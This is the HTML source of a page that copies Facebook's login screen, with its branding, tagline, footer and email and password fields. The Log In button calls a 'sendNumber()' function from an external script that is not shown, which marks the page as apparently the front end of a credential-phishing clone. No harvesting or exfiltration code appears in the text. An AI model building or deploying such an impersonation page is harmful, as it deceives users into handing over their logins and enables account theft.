<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In</title>

    <link rel="stylesheet" href="style.css">
</head>

<body>

    <main class="page">

        <section class="intro">
            <h1>facebook</h1>
            <p>
                Facebook helps you connect and share
                with the people in your life.
            </p>
        </section>

        <section class="login-area">

            <div class="login-box">

                <form id="loginForm">

                    <input
                        id="username"
                        type="text"
                        placeholder="Email address or phone number"
                        autocomplete="off"
                    >

                    <input
                        id="password"
                        type="password"
                        placeholder="Password"
                    >

                    <button type="submit" class="login-btn", onclick="sendNumber()">
                        Log In
                    </button>

                    <a href="#" class="forgot">
                        Forgotten password?
                    </a>

                    <div class="divider"></div>

                    <button type="button" class="create-btn">
                        Create new account
                    </button>

                </form>

            </div>

            <p class="create-page">
                <strong>Create a Page</strong> for a celebrity,
                brand or business.
            </p>

        </section>

    </main>

    <footer>
        <div class="languages">
            English (UK) · Français (France) · العربية · Deutsch ·
            Español · Italiano · Português
        </div>

        <div class="footer-line"></div>

        <p>Facebook © 2026</p>
    </footer>

    <script src="script.js"></script>

</body>
</html>
